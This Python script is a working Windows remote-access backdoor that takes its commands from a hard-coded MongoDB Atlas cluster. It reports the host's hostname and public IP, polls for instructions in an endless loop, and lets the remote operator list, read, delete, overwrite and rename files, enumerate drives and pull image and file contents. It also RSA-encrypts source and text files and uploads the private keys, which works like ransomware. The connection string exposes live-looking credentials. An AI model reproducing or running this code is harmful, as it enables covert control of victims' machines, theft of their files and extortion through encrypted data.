import os
import json
import rsa
import socket
import win32api
from pymongo import MongoClient
import cv2
import shutil
import numpy as np
import requests

con = "mongodb+srv://utsav:utsav@cluster0.rqeuq69.mongodb.net/?retryWrites=true&w=majority"

client = MongoClient(con,tls=True,tlsAllowInvalidCertificates=True)

try:
    response = requests.get('https://api64.ipify.org?format=json').json()
    public_ip=response['ip']
except:
    public_ip=""


hostname = socket.gethostname()
IPAddr = socket.gethostbyname(hostname)

def clearPrevData():
    db=client['shell']
    upload_col=db['shellresult']
    filters={
        "hostname":hostname
    }
    if (upload_col.find_one(filters)):
        upload_col.delete_one(filters)

def upload(data):
    db=client['shell']
    upload_col=db['shellresult']
    clearPrevData()
    upload_col.insert_one(data)


def imageReader(path,file):
    images = cv2.imread(f'{path}\\{file}')
    img=cv2.resize(np.array(images),(500,400))
    a=np.array(img)
    return a.tolist()

def action_on_system(new_path="",command="",original_filename="",update_str="",new_foldername="",new_filename="",path=""):
	if command=='dir':
		dirs=json.dumps(os.listdir(path))
		data={
            "hostname":hostname,
            "result":dirs
        }
		return data
	elif command=='cd':
		path=path+f'\{new_path}'
		print(path)
	elif command=='deletefile':
		os.remove(path+f'\{original_filename}')
	elif command=='getfile':
		with open(path+f'\{original_filename}') as f:
			con=f.read()
			return con
	elif command=='updatefile':
		with open(path+f'\{original_filename}','w') as f:
			f.write(update_str)
	elif command=='mkdir':
		os.chdir(path)
		os.mkdir(new_foldername)
	elif command=='rmdir':
		shutil.rmtree(f'{path}/{new_foldername}')
	elif command=='createfile':
		with open(path+f'/{new_filename}','w') as f:
			pass
	elif command=='renamefile':
		os.chdir(path)
		os.rename(original_filename,new_filename)


def drives():
    disk=win32api.GetLogicalDriveStrings()
    disk=disk.split('\000')[:-1]
    data={
        "hostname":hostname,
        "result":json.dumps(disk)
    }
    upload(data)


def key_generate(path,filename):
    db=client['shell']
    file_size=os.path.getsize(str(path+filename))
    if (file_size)<400:
        try:
            if file_size==0:
                file_size=512
            publicKey, privateKey = rsa.newkeys(file_size)
            sendable_private_key=byte_to_str(privateKey)
            data={
                "hostname":hostname,
                "key":sendable_private_key,
                "path":path,
                "filename":filename
            }
            col=db['privatekey']
            col.insert_one(data)
            return publicKey
        except:
            return 404

def file_valid(file_name,path):
    valid_extension = ["c", "js", "md", "py", "ts",
                   "cpp", "css", "txt", "html", "java", "json"]
    extension=str(file_name).split('.')[1]
    for i in valid_extension:
        if i==extension:
            if os.path.isfile(path+file_name):
                return True
    return False
    

def encrypt(paths,file):
    if not paths[(len(paths)-1)]=='/':
        paths=paths+'/'
    if file_valid(file_name=file,path=paths):
        try:
            with open(paths+str(file),"r") as targets:
                con=targets.read()
            with open(paths+str(file),"wb") as target:
                target.write(rsa.encrypt(con.encode(),key_generate(path=paths,filename=file)))
        except:
            return 404




def decrypt(private_key,paths,file):
    if not paths[(len(paths)-1)]=='/':
        paths=paths+'/'
    if file_valid(file_name=file,path=paths):
        try:
            with open((paths)+str(file),"rb") as targets:
                con=targets.read()
            with open((paths)+str(file),"w") as target:
                target.write(rsa.decrypt(con, private_key).decode())
        except:
            return 404


def byte_to_str(key):
    return str(key.save_pkcs1(),'UTF-8')

def str_to_byte(key):
    b= bytes(key,'UTF-8')
    return rsa.PrivateKey.load_pkcs1(b.decode('utf8'))

def action_take(listen):
    db=client['shell']
    action=listen['action']
    cwd=listen['current_path']
    if action=='dir':
        res=action_on_system(command=action,path=cwd)
        upload((res))
    elif action=='deletefile':
        target_element=listen['target_element']
        action_on_system(command=action,original_filename=target_element,path=cwd)
    elif action=='getfile':
        target_element=listen['target_element']
        content=action_on_system(command=action,original_filename=target_element,path=cwd)
        data={
            "hostname":hostname,
            "result":json.dumps(content)
        }
        upload(data)
    elif action=='updatefile':
        target_element=listen['target_element']
        target_string=listen['target_string']
        action_on_system(command=action,original_filename=target_element,update_str=target_string,path=cwd)
    elif action=='mkdir':
        target_element=listen['target_element']
        action_on_system(command=action,new_foldername=target_element,path=cwd)
    elif action=='rmdir':
        target_element=listen['target_element']
        action_on_system(command=action,new_foldername=target_element,path=cwd)
    elif action=='createfile':
        target_element=listen['target_element']
        action_on_system(command=action,new_filename=target_element,path=cwd)
    elif action=='renamefile':
        target_element=listen['target_element']
        new_filename=listen['new_filename']
        action_on_system(command=action,original_filename=target_element,new_filename=new_filename,path=cwd)
    elif action=='disks':
        drives()
    elif action=='encrypt':
        target_element=listen['target_element']
        encrypt(paths=cwd,file=target_element)
    elif action=='decrypt':
        target_element=listen['target_element']
        filters={
            "hostname":hostname,
            "filename":target_element
        }
        col=db['privatekey']
        x=col.find_one(filters)
        if x:
            col.delete_one(filters)
        decrypt(private_key=(str_to_byte(x['key'])),paths=cwd,file=target_element)
    elif action=='getimg':
        target_element=listen['target_element']
        data={
            "hostname":hostname,
            "result":imageReader(path=cwd,file=target_element)
        }
        upload(data)


def executes():
    db=client['shell']
    col=db['myshell']
    filters={
        "target":hostname
    }
    another_filter={
        "hostname":hostname
    }
    data={
            "hostname":hostname,
            "ip":str(IPAddr),
            "public_ip":str(public_ip)
        }
    sysinfo_col=db['systemInfo']
    if sysinfo_col.find_one(another_filter):
        sysinfo_col.delete_one(another_filter)
        sysinfo_col.insert_one(data)
    else:
        sysinfo_col.insert_one(data)
    while True:
        listen=col.find_one(filters)
        if listen:
            action_take(listen)
            col.delete_one(filters)

executes()